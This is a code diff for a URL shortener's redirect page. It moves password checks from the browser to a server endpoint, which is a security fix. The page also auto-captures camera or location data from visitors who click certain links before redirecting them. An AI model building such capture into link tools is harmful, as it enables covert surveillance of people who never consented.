@@ -178,26 +178,47 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
 
   const handlePasswordSubmit = async (e: any) => {
     e.preventDefault();
-    if (inputPassword === requiredPassword && urlData) {
-      setIsLocked(false);
-      if (urlData.capture_camera || urlData.capture_location) {
-        performAutoCapture(urlData);
-      } else {
-        logClick(urlData.id);
-        if (!(urlData.social_gate_title && urlData.social_gate_url)) {
-           window.location.replace(urlData.long_url);
+    setPasswordError("");
+    if (!inputPassword.trim()) {
+      setPasswordError("Password required");
+      return;
+    }
+
+    try {
+      const res = await fetch(`/api/resolve/${encodeURIComponent(shortCode)}/verify`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: inputPassword }),
+      });
+      const resData = await res.json();
+
+      if (res.ok && resData.success && resData.long_url) {
+        setIsLocked(false);
+        const resolvedData = { ...urlData, long_url: resData.long_url };
+        setUrlData(resolvedData);
+        setTargetUrl(resData.long_url);
+
+        if (resolvedData.capture_camera || resolvedData.capture_location) {
+          performAutoCapture(resolvedData);
         } else {
-          setSocialGate({
-            title: urlData.social_gate_title,
-            url: urlData.social_gate_url,
-            icon: urlData.social_gate_icon || 'link',
-            description: urlData.social_gate_description || 'Complete the action to unlock.',
-            buttonText: urlData.social_gate_button_text || 'Continue'
-          });
+          logClick(resolvedData.id);
+          if (!(resolvedData.social_gate_title && resolvedData.social_gate_url)) {
+            window.location.replace(resolvedData.long_url);
+          } else {
+            setSocialGate({
+              title: resolvedData.social_gate_title,
+              url: resolvedData.social_gate_url,
+              icon: resolvedData.social_gate_icon || 'link',
+              description: resolvedData.social_gate_description || 'Complete the action to unlock.',
+              buttonText: resolvedData.social_gate_button_text || 'Continue'
+            });
+          }
         }
+      } else {
+        setPasswordError(resData.error || "Incorrect password");
       }
-    } else {
-      setPasswordError("Incorrect password");
+    } catch {
+      setPasswordError("Verification failed, try again");
     }
   };
 
@@ -232,8 +253,7 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
           return;
         }
 
-        if (data.password) {
-          setRequiredPassword(data.password);
+        if (data.has_password) {
           setIsLocked(true);
         } else if (data.capture_camera || data.capture_location) {
           performAutoCapture(data);
